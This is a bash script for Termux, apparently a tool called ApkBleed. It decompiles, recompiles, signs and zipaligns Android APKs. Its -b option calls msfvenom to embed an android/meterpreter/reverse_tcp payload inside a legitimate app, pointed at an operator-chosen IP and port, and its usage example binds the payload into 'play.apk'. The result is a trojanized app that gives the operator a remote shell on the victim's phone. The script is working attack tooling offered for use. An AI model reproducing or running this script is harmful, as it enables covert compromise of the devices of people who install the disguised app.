#!/data/data/com.termux/files/usr/bin/bash

#color
c='\033[1;36m'
g='\033[1;32m'
r='\033[1;31m'
y='\033[1;33m'
b='\033[1;34m'
p='\033[1;35m'
re='\033[0m'

CWD=$(pwd)
VERSION="1.1"

usage() {
	echo -e "${r}ApkBleed"
	echo -e "Version: ${VERSION}"
	echo 
	echo -e "${y}Usage:"
	echo -e "apkbleed [option] [extra] [input-file-path] [output-file-path]"
	echo
	echo -e "${b}Options:"
	echo -e "  -v            Show Version"
	echo -e "  -d            Decompile Apk File"
	echo -e "  -r            Recompile Apk File"
	echo -e "  -s            Sign Apk File"
	echo -e "  -z            ZipAlign Apk File"
	echo -e "  -b            Bind Payload With Original Apk"
	echo
	echo -e "${g}Extra:"
	echo -e "  <ip-addrs>    IP Address For Payload Binding"
	echo -e "    <port>      Port For Payload Binding"
	echo -e "${r}[*] Use Extra Command Only When You Are Binding"
	echo
	echo -e "${c}Example:"
	echo -e "apkbleed -b 127.0.0.1 4444 /sdcard/apps/play.apk /sdcard/apps/binded_play.apk ${re}"
}

error_msg() {
	echo -e "${r}[!] ${1}${re}"
}

print_status() {
	echo -e  "${g}[*] ${1}${re}"
}
file_exist() {
	if [ ! -e "${1}" ]; then
		error_msg "${r}file (${1}) does not exist"
		exit 1
	fi
}

dir_exist() {
	if [ ! -d "${1}" ]; then
		error_msg "${r}directory (${1}) does not exist"
		exit 1
	fi
}

decompile() {
	print_status "${c}Decompiling ${1}${re}"
	apktool d -f ${1} -o ${2}
	print_status "${c}Decompiled into ${2}${re}"
}

recompile() {
	print_status "${c}Recompiling ${1}${re}"
	apktool b -a /usr/bin/aapt -o ${2} ${1}
	print_status "${c}Recompiled to ${2}${re}"
}

signapks() {
	print_status "${c}Signing ${1}${re}"
	print_status "Signing Apk......." && sleep 3
	signapk ${1} ${2}
	print_status "${c}Signed to ${2}${re}"
}

zipaligning() {
	print_status "${c}ZipAligning ${1}${re}"
	zipalign -f -v 4 ${1} ${2}
	print_status "${c}ZipAligned to ${2}${re}"
}

bindapk() {
	print_status "${c}Binding ${3}${re}"
	msfvenom -p android/meterpreter/reverse_tcp -x ${3} LHOST=${1} LPORT=${2} -o ${4}
	if [ ! -e ${4} ]; then
		error_msg "${r}Can't bind Then Please Create An Issue On Github"
		exit 1
	fi
	print_status "${c}Binded to ${4}${re}"
}


validate_input() {
	if [ "${1}" = "-b" ]; then
		if [ "$#" -ne 5 ]; then
			usage
			exit 1
		fi
		LHOST=${2}
		LPORT=${3}
		file_exist "${4}"
		dir_exist "${5%\/*}"
	fi
	if [ ! "${1}" = "-b" -a "$#" -ne 3 ]; then
		usage
		exit 1
	fi

	if [ "${1}" = "-d" -o "${1}" = "-s" ]; then
		file_exist "${2}"
		dir_exist "${3%\/*}"
	fi
	if [ "${1}" = "-r" ]; then
		dir_exist "${2}"
		dir_exist "${3%\/*}"
	fi
	if [ "${2}" = "-z" ]; then
		dir_exist "${3}"
		file_exist "${3}"
	fi
}

if [ "${1}" = "-h" -o "${1}" = "" ]; then
	usage
	exit 1
elif [ "${1}" = "-v" ]; then
	echo -e "${y}${VERSION}\n${re}"
fi

if [ "${1}" = "-d" -o "${1}" = "-r" -o "${1}" = "-s" -o "${1}" = "-z" ]; then
	in_abs_path=$(readlink -f ${2})
	out_abs_path=$(readlink -f ${3})
fi

if [ "${1}" = "-d" ]; then
	validate_input -d ${in_abs_path} ${out_abs_path}
	decompile ${in_abs_path} ${out_abs_path}
elif [ "${1}" = "-r" ]; then
	validate_input -r ${in_abs_path} ${out_abs_path}
	recompile ${in_abs_path} ${out_abs_path}
elif [ "${1}" = "-s" ]; then
	validate_input -s ${in_abs_path} ${out_abs_path}
	signapks ${in_abs_path} ${out_abs_path}
elif [ "${1}" = "-z" ]; then
	validate_input -z ${in_abs_path} ${out_abs_path}
	zipaligning ${2} ${3}
elif [ "${1}" = "-b" ]; then
	in_abs_path=$(readlink -f ${4})
	out_abs_path=$(readlink -f ${5})
	validate_input -b ${2} ${3} ${in_abs_path} ${out_abs_path}
	bindapk ${2} ${3} ${in_abs_path} ${out_abs_path}
else
	error_msg "Invalid input"
fi
echo -e "${re}  "


